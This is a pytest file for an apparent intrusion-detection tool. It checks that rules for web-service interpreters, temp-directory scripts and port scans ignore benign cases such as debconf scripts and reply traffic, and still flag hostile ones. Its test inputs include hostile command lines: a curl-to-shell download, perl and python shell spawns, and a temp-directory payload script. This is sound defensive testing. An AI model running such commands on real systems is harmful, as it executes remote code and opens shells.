"""M3 noise cut (false-lead ceiling 5 per modelled hour): three benign classes move to context, by generic
OS conventions, and the hostile shapes they resemble stay surfaced."""
from datetime import UTC, datetime, timedelta

import pytest

from romulus.detect.host import ScriptFromTempDir, WebServiceSpawnsInterpreter
from romulus.detect.network import PortScan
from romulus.evidence.typed import Outcome, RawRef, TypedEvent, fv

T0 = datetime(2024, 11, 18, 14, 0, tzinfo=UTC)


def exec_event(i, argv, user="www-data", host="web01"):
    fields = {"process.argv": argv, "process.user": user, "process.executable": argv[0], "process.pid": 100 + i}
    return TypedEvent(id=f"e{i}", family="process_exec", ts=T0 + timedelta(seconds=i), host=host,
                      outcome=Outcome.success, fields={k: fv(v, f"e{i}:{k}") for k, v in fields.items()},
                      raw=[RawRef(target="idx", native_id=f"d{i}")], normalizer="test@1")


def lanes(rule, events):
    rule.consume(events)
    return [m.proposed_lane for m in rule.finalize()]


# ---- web-service account running a packaged helper script

def test_packaged_helper_scripts_of_a_web_application_are_context():
    events = [exec_event(0, ["/usr/bin/perl", "-wT", "/usr/bin/appdaemon.pl", "startup"]),
              exec_event(1, ["/usr/bin/perl", "-wT", "/usr/share/app/bin/telemetry.pl"])]
    assert lanes(WebServiceSpawnsInterpreter(), events) == ["context", "context"]


@pytest.mark.parametrize("argv", [
    ["/usr/bin/perl", "-wT", "/var/www/html/upload/x.pl"],          # script in the web root
    ["/usr/bin/perl", "/tmp/x.pl"],                                 # script in a temp directory
    ["/usr/bin/perl", "-wT", "/usr/lib/cgi-bin/x.pl"],              # cgi-bin is web code, not packaged
])
def test_web_service_scripts_outside_package_directories_stay_leads(argv):
    assert lanes(WebServiceSpawnsInterpreter(), [exec_event(0, argv)]) == ["lead"]


@pytest.mark.parametrize("argv", [
    ["/bin/sh", "-c", "curl http://e/x | sh"],
    ["/usr/bin/perl", "-e", "exec '/bin/sh'"],
    ["/usr/bin/perl", "-we", "system 'id'"],                        # bundled flags hiding inline code
    ["/usr/bin/python3", "-c", "import pty;pty.spawn('/bin/bash')"],
    ["/usr/bin/python3", "-m", "http.server"],
])
def test_inline_code_from_a_web_service_account_is_never_downgraded(argv):
    out = lanes(WebServiceSpawnsInterpreter(), [exec_event(0, argv)])
    assert out and "context" not in out


# ---- Debian debconf configuration scripts

def test_debconf_package_configuration_scripts_are_context():
    event = exec_event(0, ["/bin/sh", "/tmp/openssh-server.config.gEHk9B", "configure", "1:8.9p1-3ubuntu0.7"],
                       user="root")
    assert [m.proposed_lane for m in ScriptFromTempDir().consume([event])] == ["context"]


@pytest.mark.parametrize("argv", [
    ["/bin/sh", "/tmp/payload.sh"],
    ["/bin/sh", "/tmp/openssh-server.config.gEHk9B"],                       # no maintainer action
    ["/bin/sh", "/tmp/x.config.gEHk9B", "--reverse"],                        # not a debconf action
    ["/bin/sh", "/tmp/sub/openssh-server.config.gEHk9B", "configure", "1"],  # not the debconf location
])
def test_other_temp_scripts_stay_leads(argv):
    assert [m.proposed_lane for m in ScriptFromTempDir().consume([exec_event(0, argv, user="root")])] == ["lead"]


# ---- reply traffic is not a port scan

def flow(i, src, sport, dst, dport):
    fields = {"source.ip": src, "source.port": sport, "destination.ip": dst, "destination.port": dport}
    return TypedEvent(id=f"f{i}", family="net_flow", ts=T0 + timedelta(seconds=i), host="sensor",
                      fields={k: fv(v, f"f{i}:{k}") for k, v in fields.items()},
                      raw=[RawRef(target="net", native_id=f"n{i}")], normalizer="test@1")


def test_a_service_answering_many_clients_ports_is_not_a_scan():
    replies = [flow(i, "10.0.0.5", 80, "10.0.0.9", 32768 + i) for i in range(200)]
    assert lanes(PortScan(), replies) == []


def test_a_real_scan_is_still_a_lead_even_from_a_spoofed_service_source_port():
    scan = [flow(i, "10.0.0.66", 40000 + i, "10.0.0.9", port) for i, port in enumerate(range(1, 120))]
    spoofed = [flow(500 + i, "10.0.0.77", 53, "10.0.0.9", port) for i, port in enumerate(range(1, 120))]
    assert lanes(PortScan(), scan) == ["lead"] and lanes(PortScan(), spoofed) == ["lead"]
